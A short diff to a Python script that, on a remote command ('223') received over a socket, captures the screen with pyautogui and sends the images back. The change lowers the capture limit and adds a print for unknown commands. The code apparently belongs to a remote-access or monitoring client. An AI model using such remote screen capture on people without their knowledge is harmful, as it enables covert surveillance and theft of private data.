@@ -59,7 +59,7 @@ while True:
             elif command == "223":
                 screenshot_active = not screenshot_active
                 screenshot_count = 0
-                while screenshot_active and screenshot_count < 10:
+                while screenshot_active and screenshot_count < 5:
                     screenshot = pyautogui.screenshot()
                     img_byte_arr = io.BytesIO()
                     screenshot.save(img_byte_arr, format='PNG')
@@ -69,5 +69,7 @@ while True:
                     s.send(img_msg)
                     screenshot_count += 1
                 screenshot_active = False
+            else:
+                print(f"Received message: {command}")
             new_msg = True
             full_msg = b""
